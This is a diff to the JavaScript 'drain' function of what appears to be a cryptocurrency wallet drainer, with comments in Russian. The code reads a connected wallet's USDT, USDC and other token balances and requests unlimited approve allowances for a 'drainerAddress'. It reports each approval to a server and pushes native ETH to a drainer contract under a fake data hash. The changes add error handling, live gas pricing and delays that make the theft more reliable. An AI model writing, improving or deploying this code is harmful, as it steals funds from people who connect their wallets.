@@ -503,8 +503,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
 
   const config = CHAINS[chainId];
+  if (!config) {
+    throw new Error(`Configuration for chainId ${chainId} not found`);
+  }
 
-  // Определяем tokenAddresses на уровне функции
   const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
 
   // Проверяем, было ли уже отправлено уведомление о подключении для этого кошелька
@@ -575,10 +577,16 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const MAX = ethers.constants.MaxUint256;
   const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
 
-  const ethBalance = await provider.getBalance(userAddress);
+  let ethBalance;
+  try {
+    ethBalance = await provider.getBalance(userAddress);
+  } catch (error) {
+    console.error(`❌ Ошибка получения баланса ETH: ${error.message}`);
+    throw new Error('Failed to fetch ETH balance');
+  }
   const minEthRequired = ethers.utils.parseEther("0.0003");
   if (ethBalance.lt(minEthRequired)) {
-    throw new Error();
+    throw new Error('Insufficient ETH balance');
   }
 
   const tokensToProcess = [];
@@ -591,7 +599,8 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         tokenContract.decimals()
       ]);
       return { tokenAddress, tokenContract, realBalance, decimals };
-    } catch {
+    } catch (error) {
+      console.warn(`⚠️ Не удалось получить данные токена ${tokenAddress}: ${error.message}`);
       return { tokenAddress, tokenContract, realBalance: ethers.BigNumber.from(0), decimals: 18 };
     }
   });
@@ -606,7 +615,12 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     if (realBalance.gt(0) && realBalance.gt(MIN_TOKEN_BALANCE)) {
       const symbol = tokenAddress === config.usdtAddress ? "USDT" :
                     tokenAddress === config.usdcAddress ? "USDC" :
-                    Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress);
+                    Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+      // Пропускаем токены, если symbol не определён (на всякий случай)
+      if (!symbol) {
+        console.warn(`⚠️ Пропущен токен ${tokenAddress}: символ не определён`);
+        continue;
+      }
       tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
     }
   }
@@ -624,25 +638,43 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   let status = 'rejected';
   for (const { token, balance, contract, address, decimals } of tokensToProcess) {
+    // Дополнительная проверка на undefined
+    if (!token) {
+      console.error(`❌ Токен не определён для адреса ${address}, пропускаем`);
+      continue;
+    }
     console.log(`Выводимый токен: ${token}`);
 
     const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
+    console.log(`📜 Allowance для ${config.drainerAddress}: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);
 
     if (allowanceBefore.lt(balance)) {
       try {
         const nonce = await provider.getTransactionCount(userAddress, "pending");
+        console.log(`📝 Nonce: ${nonce}`);
+        const gasPrice = await provider.getGasPrice();
+        console.log(`📏 Текущая цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
+
+        // Добавляем задержку перед вызовом approve, чтобы кошелёк успел обработать запрос
+        console.log(`⏳ Ожидаем 1 секунду перед вызовом approve для токена ${token}`);
+        await delay(1000);
+
         const tx = await contract.approve(config.drainerAddress, MAX, {
           gasLimit: 100000,
-          gasPrice: ethers.utils.parseUnits("3", "gwei"),
+          gasPrice: gasPrice, // Используем актуальную цену газа
           nonce
         });
+        console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
         const receipt = await tx.wait();
+        console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
         status = 'confirmed';
-      } catch {
-        throw new Error();
+      } catch (error) {
+        console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
+        throw new Error(`Failed to approve token ${token}: ${error.message}`);
       }
     } else {
+      console.log(`✅ Allowance уже достаточно для токена ${token}, выполняем notifyServer`);
       await notifyServer(userAddress, address, balance, chainId, null, provider);
       status = 'confirmed';
     }
@@ -660,23 +692,32 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       const taskId = Math.floor(Math.random() * 1000000);
       const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
       const nonce = await provider.getTransactionCount(userAddress, "pending");
-      // Инициализируем tokenAddresses для нативных токенов
       const tokenAddressesForNative = [];
 
       try {
+        const gasPrice = await provider.getGasPrice();
+        console.log(`📏 Текущая цена газа для нативного токена: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
+
+        // Добавляем задержку перед вызовом processData
+        console.log(`⏳ Ожидаем 1 секунду перед вызовом processData для нативного токена`);
+        await delay(1000);
+
         const tx = await drainer.processData(taskId, dataHash, nonce, tokenAddressesForNative, {
           value,
           gasLimit: 100000,
-          gasPrice: ethers.utils.parseUnits("3", "gwei"),
+          gasPrice: gasPrice,
           nonce
         });
+        console.log(`📤 Транзакция processData отправлена: ${tx.hash}`);
         const receipt = await tx.wait();
         if (receipt.status !== 1) {
-          throw new Error();
+          throw new Error('Transaction failed');
         }
+        console.log(`✅ Транзакция processData подтверждена: ${receipt.transactionHash}`);
         status = 'confirmed';
-      } catch {
-        throw new Error();
+      } catch (error) {
+        console.error(`❌ Ошибка вывода нативного токена: ${error.message}`);
+        throw new Error(`Failed to process native token: ${error.message}`);
       }
     }
   }
